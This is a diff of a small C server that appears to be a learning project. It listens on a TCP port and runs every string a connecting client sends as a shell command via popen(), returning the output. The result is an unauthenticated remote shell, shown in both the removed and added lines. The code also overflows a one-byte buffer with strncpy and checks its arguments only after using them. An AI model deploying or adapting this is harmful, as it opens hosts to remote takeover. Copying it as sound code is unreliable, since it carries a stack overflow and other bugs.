@@ -5,41 +5,7 @@
 #include <sys/socket.h> // for "socket(), connect(), send() and recv()"
 #include <arpa/inet.h> //for "sockaddr_in and inet_addr()"
 
-#define MAXSIZE 1024
-
-void exchange (int client_socket){
-
-	char cmd[MAXSIZE];
-	char buffer[MAXSIZE];
-	char strings_msg[] = "";
-	FILE *output;
-	int i;
-
-	// Loop for exchange between Client & Server
-	for(;;){
-
-		bzero(cmd,MAXSIZE);
-
-		// Receve and convert the socket from the client
-		int bytes_of_socket  = recv(client_socket, cmd, sizeof(cmd),0);
-		strncpy(strings_msg, cmd, bytes_of_socket);
-		strings_msg[bytes_of_socket] = '\0';
-
-		// Execute Linux command & create an output of this command
-		output = popen (strings_msg, "r");
-		if (output == NULL){
-			printf("Failed");
-			fputs("Failed to execute command, try again ! \n", stderr);
-
-		}
-
-		else {
-			while (fgets(buffer, MAXSIZE-1, output) != NULL){
-				send(client_socket, buffer, strlen(buffer), 0);
-			}
-		}
-	}
-}
+#define MAXSIZE 4096
 
 int main(int argc, char *argv[]){
 
@@ -47,10 +13,21 @@ int main(int argc, char *argv[]){
 	int port = atoi(argv[1]);
 	char *ip = argv[2];
 
+	char cmd[MAXSIZE];
+	char buffer[MAXSIZE];
+	char strings_msg[] = "";
+
+	FILE *output;
+
 	int server_socket, client_socket, binding;
 
 	struct sockaddr_in server_addr, client_addr;
 	int n, len;
+
+	if (argc != 3) {
+         printf("You need to specify port number and IP address ! \n");
+         exit(1);
+     }
 	
 	server_socket = socket(AF_INET, SOCK_STREAM, 0);
 	if (server_socket < 0){
@@ -70,8 +47,9 @@ int main(int argc, char *argv[]){
 		perror("[-] Bind error");
 		exit(1);
 	}
+
 	else {
-		printf("[+] Bind to port number: %d | IP address: %s \n", port, ip);
+		printf("[+] Bind to port number : %d | IP address : %s \n", port, ip);
 		n = listen(server_socket,1);
 
 		if(n<0){
@@ -91,8 +69,32 @@ int main(int argc, char *argv[]){
 
 		printf("[+] Client connected from %s ! \n",inet_ntoa(client_addr.sin_addr));
 	}
-	
-	exchange(client_socket);
+
+	// Loop for exchange between Client & Server
+	while(1){
+
+		bzero(cmd,MAXSIZE);
+		bzero(buffer,MAXSIZE);
+
+		// Receve and convert the socket from the client
+		int bytes_of_socket  = recv(client_socket, cmd, sizeof(cmd),0);
+		strncpy(strings_msg, cmd, bytes_of_socket);
+		strings_msg[bytes_of_socket] = '\0';
+
+		// Execute Linux command & create an output of this command
+		output = popen (strings_msg, "r");
+		if (output == NULL){
+			fputs("Failed to execute command, try again ! \n", stderr);
+			exit(0);
+		}
+
+		else {
+			while (fgets(buffer, MAXSIZE-1, output) != NULL){
+				send(client_socket, buffer, strlen(buffer), 0);
+				sleep(0.01);
+			}
+		}
+	}
 
 	return 0;
 }
